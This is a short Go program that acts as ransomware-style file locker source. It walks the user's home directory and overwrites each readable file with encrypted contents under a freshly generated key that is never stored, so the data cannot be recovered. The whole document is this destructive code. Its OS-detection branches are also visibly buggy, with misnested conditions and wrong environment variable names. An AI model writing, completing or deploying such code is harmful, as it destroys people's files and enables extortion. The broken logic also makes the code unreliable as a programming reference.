package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"

	"github.com/go-locker/locker"
)

func main() {
	var files []string
	var home string

	newkey := locker.KeyGen()

	// Grabbing path to users home directory.
	if runtime.GOOS == "windows" {
		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		if runtime.GOOS == "linux" {
			home = os.Getenv("$HOME")
		} else {
			home = os.Getenv("Home")
		}

		err := filepath.Walk(home, locker.Walker(&files))
		if err != nil {
			panic(err)
		}
		for _, file := range files {
			fmt.Printf("Locking %d: %s", len(files), file)

			clearText, err := ioutil.ReadFile(file)
			if err != nil {
				continue
			}
			locked, err := locker.Encrypt(clearText, newkey)
			if err != nil {
				fmt.Println(err)
			}

			err = ioutil.WriteFile(file, locked, 0644)
			if err != nil {
				continue
			}

		}
	}

}
